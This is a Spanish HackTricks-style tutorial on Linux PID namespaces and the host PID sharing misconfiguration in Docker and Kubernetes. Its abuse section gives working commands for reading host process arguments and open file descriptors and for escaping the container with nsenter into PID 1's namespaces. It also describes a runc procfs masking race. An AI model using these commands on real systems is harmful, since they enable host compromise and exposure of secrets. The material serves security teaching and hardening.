# PID Namespace

{{#include ../../../../../banners/hacktricks-training.md}}

## Descripción general

El PID namespace controla cómo se numeran los procesos y qué procesos son visibles. Por eso un container puede tener su propio PID 1 aunque no sea una máquina real. Dentro del namespace, el workload ve lo que parece un árbol de procesos local. Fuera del namespace, el host sigue viendo los PID reales del host y todo el panorama de procesos.

Desde el punto de vista de la seguridad, el PID namespace es importante porque la visibilidad de los procesos es valiosa. Cuando un workload puede ver procesos del host, es posible que pueda observar nombres de servicios, argumentos de la línea de comandos, secretos pasados en los argumentos de los procesos, estado derivado del entorno a través de `/proc` y posibles objetivos para entrar en otros namespaces. Si puede hacer algo más que limitarse a ver esos procesos, por ejemplo enviar signals o usar ptrace bajo las condiciones adecuadas, el problema se vuelve mucho más grave.

## Funcionamiento

Un nuevo PID namespace comienza con su propia numeración interna de procesos. El primer proceso creado dentro de él se convierte en el PID 1 desde el punto de vista del namespace, lo que también significa que recibe una semántica especial similar a la de init para los procesos hijos huérfanos y el comportamiento de las signals. Esto explica muchas particularidades de los containers relacionadas con los procesos init, la recolección de zombies y el motivo por el que a veces se utilizan wrappers de init pequeños en los containers.

La lección de seguridad importante es que un proceso puede parecer aislado porque solo ve su propio árbol de PID, pero ese aislamiento se puede eliminar deliberadamente. Docker lo expone mediante `--pid=host`, mientras que Kubernetes lo hace mediante `hostPID: true`. Cuando el container se une al PID namespace del host, el workload ve directamente los procesos del host y muchas vías de ataque posteriores se vuelven mucho más realistas.

## Laboratorio

Para crear manualmente un PID namespace:
```bash
sudo unshare --pid --fork --mount-proc bash
ps -ef
echo $$
```
El shell ahora ve una vista privada de los procesos. El flag `--mount-proc` es importante porque monta una instancia de procfs que coincide con el nuevo PID namespace, haciendo coherente la lista de procesos desde dentro.

Para comparar el comportamiento de los containers:
```bash
docker run --rm debian:stable-slim ps -ef
docker run --rm --pid=host debian:stable-slim ps -ef | head
```
La diferencia es inmediata y fácil de entender, por lo que este es un buen primer laboratorio para los lectores.

## Uso en Runtime

Los contenedores normales en Docker, Podman, containerd y CRI-O obtienen su propio PID namespace. Los Kubernetes Pods normalmente también reciben una vista de PID aislada, a menos que el workload solicite explícitamente compartir el PID del host. Los entornos LXC/Incus dependen de la misma primitiva del kernel, aunque los casos de uso de system-containers pueden exponer árboles de procesos más complicados y fomentar más atajos de debugging.

La misma regla se aplica en todas partes: si el runtime decidió no aislar el PID namespace, eso supone una reducción deliberada de la frontera del contenedor.

## Configuraciones incorrectas

La configuración incorrecta canónica es compartir el PID del host. Los equipos suelen justificarlo por conveniencia para debugging, monitoring o service management, pero siempre debe tratarse como una excepción de seguridad significativa. Incluso si el contenedor no tiene una primitive de escritura inmediata sobre los procesos del host, la visibilidad por sí sola puede revelar mucha información sobre el sistema. Una vez que se añaden capabilities como `CAP_SYS_PTRACE` o un acceso útil a procfs, el riesgo aumenta considerablemente.

Otro error es asumir que, como el workload no puede matar ni usar ptrace sobre los procesos del host de forma predeterminada, compartir el PID del host es inofensivo. Esa conclusión ignora el valor de la enumeración, la disponibilidad de objetivos para `nsenter` y la forma en que la visibilidad de los PID se combina con otros controles debilitados.

## Abuse

Si se comparte el PID namespace del host, un atacante puede inspeccionar los procesos del host, recopilar argumentos de procesos, identificar servicios interesantes, localizar PIDs candidatos para `nsenter` o combinar la visibilidad de procesos con privilegios relacionados con ptrace para interferir con workloads del host o de otros contenedores. En algunos casos, simplemente ver el proceso de larga duración adecuado basta para replantear el resto del attack plan.

El primer paso práctico siempre es confirmar que los procesos del host son realmente visibles:
```bash
readlink /proc/self/ns/pid
ps -ef | head -n 50
ls /proc | grep '^[0-9]' | head -n 20
```
Una vez que los PID del host son visibles, los argumentos de los procesos y los destinos de entrada a namespaces suelen convertirse en la fuente de información más útil:
```bash
for p in 1 $(pgrep -n systemd 2>/dev/null) $(pgrep -n dockerd 2>/dev/null); do
echo "PID=$p"
tr '\0' ' ' < /proc/$p/cmdline 2>/dev/null; echo
done
```
Si `nsenter` está disponible y existen privilegios suficientes, comprueba si un proceso visible del host puede utilizarse como puente de namespace:
```bash
which nsenter
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "nsenter blocked"
```
Incluso cuando la entrada está bloqueada, compartir los PID del host ya es valioso porque revela la estructura de servicios, los componentes del runtime y los procesos privilegiados candidatos que se pueden atacar a continuación.

La visibilidad de los PID del host también hace más realista el abuso de descriptores de archivos. Si un proceso privilegiado del host o una carga de trabajo vecina tiene abierto un archivo o socket sensible, el atacante podría inspeccionar `/proc/<pid>/fd/` y reutilizar ese handle, dependiendo de la propiedad, las opciones de montaje de procfs y el modelo del servicio objetivo.
```bash
for fd_dir in /proc/[0-9]*/fd; do
ls -l "$fd_dir" 2>/dev/null | sed "s|^|$fd_dir -> |"
done
grep " /proc " /proc/mounts
```
Estos comandos son útiles porque permiten determinar si `hidepid=1` o `hidepid=2` están reduciendo la visibilidad entre procesos y si descriptores obviamente interesantes, como archivos secretos abiertos, logs o sockets Unix, son visibles.

### Ejemplo completo: PID del host + `nsenter`

Compartir el PID del host se convierte en un escape directo del host cuando el proceso también tiene suficientes privilegios para unirse a los namespaces del host:
```bash
ps -ef | head -n 50
capsh --print | grep cap_sys_admin
nsenter -t 1 -m -u -n -i -p /bin/bash
```
Si el comando tiene éxito, el proceso del contenedor se está ejecutando ahora en los namespaces de mount, UTS, network, IPC y PID del host. El impacto es un compromiso inmediato del host.

Incluso cuando falta `nsenter`, puede lograrse el mismo resultado mediante el binario del host si el filesystem del host está montado:
```bash
/host/usr/bin/nsenter -t 1 -m -u -n -i -p /host/bin/bash 2>/dev/null
```
### Notas recientes del runtime

Algunos ataques relevantes para los PID namespaces no son configuraciones erróneas tradicionales de `hostPID: true`, sino bugs de implementación del runtime relacionados con cómo se aplican las protecciones de procfs durante la configuración del container.

#### Race de `maskedPaths` hacia el procfs del host

En versiones vulnerables de `runc`, los atacantes capaces de controlar la imagen del container o la workload de `runc exec` podían provocar una race en la fase de masking reemplazando el `/dev/null` del container por un symlink hacia una ruta sensible de procfs, como `/proc/sys/kernel/core_pattern`. Si la race tenía éxito, el bind mount de la ruta masked podía terminar en el target incorrecto y exponer los knobs globales del procfs del host al nuevo container.

Comando útil para la revisión:
```bash
jq '.linux.maskedPaths' config.json 2>/dev/null
```
Esto es importante porque el impacto final puede ser el mismo que el de una exposición directa de procfs: `core_pattern` o `sysrq-trigger` con permisos de escritura, seguidos de ejecución de código en el host o una denegación de servicio.

#### Inyección de namespaces con `insject`

Las herramientas de inyección de namespaces, como `insject`, demuestran que la interacción con un PID namespace no siempre requiere entrar previamente en el namespace objetivo antes de crear el proceso. Un helper puede conectarse posteriormente, usar `setns()` y ejecutar código manteniendo la visibilidad del espacio de PID objetivo:
```bash
sudo insject -S -p $(pidof containerd-shim) -- bash -lc 'readlink /proc/self/ns/pid && ps -ef'
```
Este tipo de técnica es relevante principalmente para debugging avanzado, offensive tooling y workflows de post-exploitation en los que el contexto del namespace debe unirse después de que el runtime ya haya inicializado la carga de trabajo.

### Patrones relacionados de abuso de FD

Conviene mencionar explícitamente dos patrones cuando los PIDs del host son visibles. En primer lugar, un proceso con privilegios puede mantener abierto un file descriptor sensible durante `execve()` porque no se marcó con `O_CLOEXEC`. En segundo lugar, los servicios pueden pasar file descriptors a través de Unix sockets mediante `SCM_RIGHTS`. En ambos casos, el objeto interesante ya no es el pathname, sino el handle ya abierto que un proceso con menos privilegios puede heredar o recibir.

Esto es importante en el trabajo con containers porque el handle puede apuntar a `docker.sock`, un log privilegiado, un archivo de secrets del host u otro objeto de alto valor, incluso cuando no se puede acceder directamente al path desde el filesystem del container.

## Comprobaciones

El propósito de estos comandos es determinar si el proceso tiene una vista privada de los PIDs o si ya puede enumerar un panorama de procesos mucho más amplio.
```bash
readlink /proc/self/ns/pid   # PID namespace identifier
ps -ef | head                # Quick process list sample
ls /proc | head              # Process IDs and procfs layout
```
Qué es interesante aquí:

- Si la lista de procesos contiene servicios obvios del host, probablemente ya esté habilitado el uso compartido de los PID del host.
- Ver únicamente un árbol pequeño y local del container es la línea base normal; ver `systemd`, `dockerd` o daemons no relacionados no lo es.
- Una vez visibles los PID del host, incluso la información de procesos de solo lectura resulta útil para el reconocimiento.

Si descubres un container ejecutándose con uso compartido de los PID del host, no lo trates como una diferencia meramente estética. Es un cambio importante en lo que el workload puede observar y potencialmente afectar.
{{#include ../../../../../banners/hacktricks-training.md}}
